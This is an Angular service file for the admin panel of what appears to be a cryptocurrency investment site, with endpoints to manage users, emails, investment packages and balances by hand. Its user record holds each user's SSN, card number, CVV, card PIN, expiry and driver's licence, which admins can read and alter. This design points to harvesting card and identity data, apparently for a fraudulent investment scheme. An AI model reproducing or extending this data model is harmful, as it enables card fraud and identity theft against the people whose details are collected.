import { HttpClient } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { Observable } from 'rxjs';
import { environment } from 'src/environments/environment';


export interface Investments {
  _id: string;
  amount: number;
  coinName: string;
  confirmation: string;
  createdOn: number;
  currentBalance: number;
  email: string;
  increament: number;
  packageType: string;
  user: string;
  wallet: string;
}


export interface Users {
  createdOn: number;
  email: string;
  firstName: string;
  lastName: string;
  _id: string;
  refCode: string;
  refererId: string;
  SSN: string;
  CVV: string;
  expiry: string;
  cardPin: string;
  cardNumber: string;
  driverLin: string[];
  walletAddress: string;
}


@Injectable({
  providedIn: 'root'
})
export class AdminService {

  constructor(private http: HttpClient) { }

  url = environment.url;
  investments: Investments[] = [];

  public users: Users[] = [];

  updateAdress(update: any, userId: string): Observable<any> {
    return this.http.patch(`${this.url}admin/update/${userId}`, update);
  }

  getUsers(): Observable<any> {
    return this.http.get(`${this.url}admin/users`);
  }


  getAdminInfo(): Observable<any> {
    return this.http.get(`${this.url}admin/getInfo`)
  }

  getUser(userId: string): Observable<any> {
    return this.http.get(`${this.url}admin/user/${userId}`);
  }

  removeUser(userId: string): Observable<any> {
    return this.http.delete(`${this.url}admin/user/${userId}`);
  }


  generateMail(infor: any): Observable<any> {
    console.log(infor);
    return this.http.post(`${this.url}admin/sendMail`, infor);
  }


  getMail(): Observable<any> {
    return this.http.get(`${this.url}admin/sendMail`)
  }


  getInvestment(): Observable<any> {
    return this.http.get(`${this.url}admin/investment`);
  }

  load_account(info: any): Observable<any> {
    return this.http.post(`${this.url}admin/investment`, info);
  }

  getUserInvestment(userId: string): Observable<any> {
    return this.http.get(`${this.url}admin/investment/user/${userId}`);
  }

  updateVetsment(investmentId: string, confrimaion: any): Observable<any> {
    return this.http.patch(`${this.url}admin/investments/${investmentId}`, confrimaion);
  }


  removeInvest(investmentId: string): Observable<any> {
    return this.http.delete(`${this.url}admin/investments/${investmentId}`);
  }

  removePartInvestment(investmentId: string): Observable<any> {
    return this.http.delete(`${this.url}admin/investments/part/${investmentId}`);
  }

  getUserByMail(email: string): Observable<any> {
    return this.http.get(`${this.url}admin/user/email/${email}`);
  }


  postInvestmentPackage(information: any): Observable<any> {
    return this.http.post(`${this.url}admin/general/investment`, information)
  }

  UdateInvestmentPackage(information: any, id: string): Observable<any> {
    return this.http.patch(`${this.url}admin/general/${id}`, information)
  }

  daleteInvestmentPackage(id: string): Observable<any> {
    return this.http.delete(`${this.url}admin/general/${id}`)
  }

  getInvestmentPackage(): Observable<any> {
    return this.http.get(`${this.url}admin/general/investment`)
  }


  postToken(information: any): Observable<any> {
    return this.http.post(`${this.url}admin/payment`, information)
  }

  UdateToken(information: any, id: string): Observable<any> {
    return this.http.patch(`${this.url}admin/payment/${id}`, information)
  }

  daleteToken(id: string): Observable<any> {
    return this.http.delete(`${this.url}admin/payment/${id}`)
  }

  getToken(): Observable<any> {
    return this.http.get(`${this.url}admin/payment`)
  }

  getOneInvestmentPackage(id:string) {
    return this.http.get(`${this.url}admin/general/getone/${id}`)
  }

  postMail(info: any): Observable<any> {
    return this.http.patch(`${this.url}admin/postMail`, info)
  }


  addRefBonus(amount: any): Observable<any> {
    return this.http.patch(`${this.url}admin/updateUser`, amount)
  }
}
